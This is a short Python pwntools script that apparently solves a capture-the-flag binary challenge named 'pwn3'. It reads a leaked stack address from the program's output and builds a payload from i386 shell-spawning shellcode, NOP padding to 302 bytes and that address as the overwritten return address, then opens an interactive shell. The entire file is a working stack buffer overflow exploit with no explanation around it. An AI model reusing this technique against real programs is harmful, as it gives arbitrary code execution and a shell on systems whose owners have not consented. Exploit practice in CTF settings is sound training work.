from pwn import *

p = process('./pwn3')
e = ELF('./pwn3')

res = p.recvuntil('!')
addr = int(res.split(' ')[9][:-1],16)

shellcode = asm(shellcraft.i386.linux.sh())
print shellcode

payload = shellcode
payload += '\x90'*(302 - len(shellcode))
payload += p32(addr)
#payload = 'A' * 302
#payload += p32(addr)
#payload += shellcode
#payload += p32(addr)

p.sendline(payload)
p.interactive()
print p.recv()